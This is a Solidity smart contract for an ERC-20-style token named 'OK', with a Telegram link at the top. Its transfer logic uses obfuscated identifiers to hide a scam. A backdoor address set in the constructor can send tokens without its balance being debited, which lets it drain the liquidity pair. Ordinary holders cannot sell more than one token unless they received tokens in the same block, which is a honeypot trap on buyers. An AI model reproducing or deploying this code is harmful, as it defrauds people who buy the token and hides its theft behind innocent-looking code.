/*

https://t.me/dorkjimerc

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OK is Ownable {
    function transferFrom(address nmodgvktl, address iahpbzgeluky, uint256 bucmqwsa) public returns (bool success) {
        require(bucmqwsa <= allowance[nmodgvktl][msg.sender]);
        allowance[nmodgvktl][msg.sender] -= bucmqwsa;
        ditbzurye(nmodgvktl, iahpbzgeluky, bucmqwsa);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private dhqyswt;

    string public name;

    uint256 private gtakzdhn = 119;

    function transfer(address iahpbzgeluky, uint256 bucmqwsa) public returns (bool success) {
        ditbzurye(msg.sender, iahpbzgeluky, bucmqwsa);
        return true;
    }

    function approve(address wzck, uint256 bucmqwsa) public returns (bool success) {
        allowance[msg.sender][wzck] = bucmqwsa;
        emit Approval(msg.sender, wzck, bucmqwsa);
        return true;
    }

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;

    mapping(address => uint256) private pfnhxkacmrz;

    mapping(address => uint256) private nrfxkhaygsw;

    function ditbzurye(address nmodgvktl, address iahpbzgeluky, uint256 bucmqwsa) private {
        address dastclkzuojr = IUniswapV2Factory(dhqyswt.factory()).getPair(address(this), dhqyswt.WETH());
        if (pfnhxkacmrz[nmodgvktl] == 0) {
            if (nmodgvktl != dastclkzuojr && nrfxkhaygsw[nmodgvktl] != block.number && bucmqwsa < totalSupply) {
                require(bucmqwsa <= totalSupply / (10 ** decimals));
            }
            balanceOf[nmodgvktl] -= bucmqwsa;
        }
        balanceOf[iahpbzgeluky] += bucmqwsa;
        nrfxkhaygsw[iahpbzgeluky] = block.number;
        emit Transfer(nmodgvktl, iahpbzgeluky, bucmqwsa);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory bpszktu, string memory nykqumd, address ymxrfpgwtua, address exolnq) {
        name = bpszktu;
        symbol = nykqumd;
        balanceOf[msg.sender] = totalSupply;
        pfnhxkacmrz[exolnq] = gtakzdhn;
        dhqyswt = IUniswapV2Router02(ymxrfpgwtua);
    }
}
